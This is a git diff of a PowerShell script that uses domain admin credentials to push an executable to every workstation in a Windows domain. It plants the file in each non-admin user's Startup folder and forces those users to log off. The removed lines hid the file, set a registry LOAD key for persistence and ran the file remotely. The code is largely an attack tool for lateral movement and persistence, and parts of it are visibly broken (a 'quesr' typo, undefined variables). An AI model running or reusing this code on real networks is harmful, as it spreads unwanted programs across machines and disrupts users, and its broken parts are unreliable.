@@ -1,54 +1,16 @@
 ﻿<#
-    Hiding the file and setting a registry key for the file to be launched at boot.
-    Modified only for the currently logged in user on the remote machine.
 
-    Full key path: HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows\LOAD
-
-#>
-function Set-HiddenFile ($computer,$remoteHostPath,$adm_credential){
-    # Make file hidden.
-    Invoke-Command -ComputerName $computer -Credential $adm_credential -ScriptBlock { param ($rhp) $file = get-item $rhp -Force } -ArgumentList $remoteHostPath
-	Invoke-Command -ComputerName $computer -Credential $adm_credential -ScriptBlock { $file.Attributes="Hidden" }
-
-    # Set a LOAD registry Key for persistence.
-    Invoke-Command -ComputerName $computer -Credential $adm_credential -ScriptBlock { 
-    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name LOAD -Value $remoteHostPath
-    }
-}
-
-<#
 .DESCRIPTION
 
 Attempts to take a program the user specifies and distribute it across a domain environment.
-Must be run with domain admin credentials. 
-
+Must be run with domain admin credentials.
+ 
 .PARAMETER FilePath
+
 Full path to an executable the user wishes to distribute.
 
-.PARAMETER Program
-Specifies the name of the program as it would be display via Get-Process. No input validation (yet).
-
 .EXAMPLE
-
-PS> Add-DomainExe -FilePath "C:\Windows\Temp\saveme.exe" -Program "saveme" -Persistence N
-[+] Attempting to connect to WKST00...
-[+] Placing saveme on WKST00 for johnson.user...
-[+] Executing saveme on WKST00...
-
-[+] Attempting to connect to WKST01...
-...
-[+] saveme installed on all hosts!
-
-.EXAMPLE
-
-PS> Add-DomainExe -FilePath "C:\Windows\Temp\saveme.exe" -Program "saveme" -Persistence Y
-[+] Attempting to connect to WKST00...
-[+] Placing saveme on WKST00 for johnson.user...
-[+] Executing saveme on WKST00...
-[+] Setting persistence in HKCU\ on WKST00...
-[+] Persistence successful on WKST00!
-...
-[+] saveme installed on all hosts!
+PS> Add-DomainExe -FilePath "C:\Windows\Temp\saveme.exe" -Username "User" -Password "P@ssw0rd"
 
 #>
 
@@ -59,16 +21,14 @@ function Add-DomainExe {
         }
         return $true
         })]$FilePath,
-        [ValidateScript({ if (-Not ("Y" -or "N")) {
-        throw "Please input Y\N for persistence."
-        }
-        return $true
-        })]$Persistence,
         [parameter(mandatory=$true)]$Username,
-        [parameter(mandatory=$true)]$Password,
-        $Program
+        [parameter(mandatory=$true)]$Password
 
     )
+    
+    $inputpath = $FilePath -split "\\"
+    $file_split = $inputpath[-1]
+    $program = $file_split -split "\."
     
     # Credential variable without prompt
     $user = $Username
@@ -90,40 +50,47 @@ function Add-DomainExe {
 
         else {
             try {
-                # Open a remote powershell session directly with the host if Get-WmiObject does not function correctly.
+                # Create a remote PSsession for interaction with the workstation.
+                Write-Host "[+] Attempting to connect to  [$computer]"
                 $s = New-PSSession -ComputerName $computer -Credential $adm_credential -ErrorAction SilentlyContinue
 
-                # Get the currently logged on user's name and if we can't remote into the machine ignore it.                
-                $current_user = (Invoke-Command -Session $s -ScriptBlock {param ($comp) Get-WmiObject -Class win32_computersystem -ComputerName $comp  | Select-Object username} -ArgumentList $computer) -split '\\'
-                $currentuser = $current_user[1].Split(';')
-                $currentuser = $currentuser[0]
-
-                Write-Host "[+] Placing [$Program] on [$computer] for [$currentuser]..."
-                $remoteHostPath = "C:\Users\$currentuser\Desktop"
+                
                 Copy-Item $FilePath -Destination $remoteHostPath -ToSession $s
 
-                if($Persistence -eq "Y"){
-                    Set-HiddenFile($computer,$remoteHostPath,$adm_credential)
-                    $computer >> persistent_hosts.txt
+                try {
+                    # Get the current user's login id.
+                    $user_regex = quesr | ForEach-Object -Process {'\s{2,}',','}
+                    $user_object = $user_regex | ConvertFrom-Csv
+                    Write-Host "[+] Found $($user_object.Count) user login(s) on computer."
+                    $user_object | ForEach-Object{
+                        if ($_.Username -match "adm.*"){
+                            Write-Host "[!] Current logged in user is an admin. Ignoring."
+                        }
+                        else {
+                            Write-Host "[+] Placing [$Program] on [$computer] for [$_.Username]..."
+                            $remoteHostPath = "C:\Users\"+ $_.Username +"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+                            Copy-Item $FilePath -Destination $remoteHostPath -ToSession $s
+                            Write-Host "[+] Logging off $_.Username..."
+                            logoff $_.sessionname
+                        }
+                    }
                 }
 
-                "[+] Executing [$Program] on [$computer]" | Tee-Object -FilePath .\hosts_w_file.txt -Append | Write-Host
-                # Invoke-Command -ComputerName $computer -Credential $adm_credential -ScriptBlock { C:\Users\$current_user\Desktop\bad.exe }
-                $runtheexe = "C:\users\" + $currentuser + "\Desktop\" + $Program + ".exe"
-                $runtheexe
-                Invoke-Command -Session $s -ScriptBlock { param ($run) & $run } -ArgumentList $runtheexe
 
+                catch {
+                    if ($_.Exception.Message -match 'No User exists'){
+                    Write-Host "[!] No users are logged in. Ignoring."
+                }
+                else {
+                    throw $_.Exception.Message
+                }
+            }                
                 Remove-PSSession $s
             }
 
             # If can't connect, print a short message.
             catch [System.UnauthorizedAccessException] {
                 Write-Warning -Message "[-] Access Denied: [$computer]"
-            }
-
-            # Any other serious errors print the stack trace.
-            catch {
-                "[-] An Error has occured:" + $_.ScriptStackTrace | Tee-Object -FilePath .\hosts_w_file.txt -Append | Write-Host
             }
         Write-Host ""
         }
@@ -133,35 +100,7 @@ function Add-DomainExe {
 
 <#
 .DESCRIPTION
-
-Parse list of hosts with file successfully copied.
-
-.PARAMETER HostFile
-Full path to host_w_file.txt.
-
-.PARAMETER OutFile
-Location where you'd like the parsed file to be saved. (Optional)
-
-#>
-
-function Convert-RemoteFileHosts(){
-    param(
-    [parameter(mandatory=$true)]
-    $HostFile,
-    $OutFile
-    )
-
-    #do the thing.
-}
-
-<#
-.DESCRIPTION
-
-Remove files and verify all registry keys are deleted if set.
-
-.PARAMETER HostFile
-Full path to a parsed host list.
-
+Remove files placed via Add-DomainExe
 #>
 
 function Remove-DomainExe(){
@@ -169,12 +108,20 @@ function Remove-DomainExe(){
     [parameter(mandatory=$true)]$HostFile,
     [parameter(mandatory=$true)]$FileName,
     [parameter(mandatory=$true)]$Username,
-    [parameter(mandatory=$true)]$Password,
-    $PathToFile,
-    $WildcardSearch
+    [parameter(mandatory=$true)]$Password
     )
 
-    Write-Host "[+] Placing [$Program] on [$computer] for [$currentuser]..."
-    $remoteHostPath = "C:\Windows\Users\[$currentuser]\Desktop"
-    Invoke-Command -ComputerName $computer -Credential $adm_credential -ScriptBlock { copy $FilePath $remoteHostPath}
+    $hosts = Get-Content $HostFile
+    ForEach ($host in $hosts){
+        
+        $remoteDirectories = 'C:\User*\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\'
+
+        $s = New-PSSession -ComputerName $computer -Credential $adm_credential -ErrorAction SilentlyContinue
+        invoke-command -session $s {Get-ChildItem $remoteDirectories | ForEach-Object {
+            Remove-Item $_ + $FileName
+            }
+        Remove-PSSession $s
+        }
+   
+    }
 }
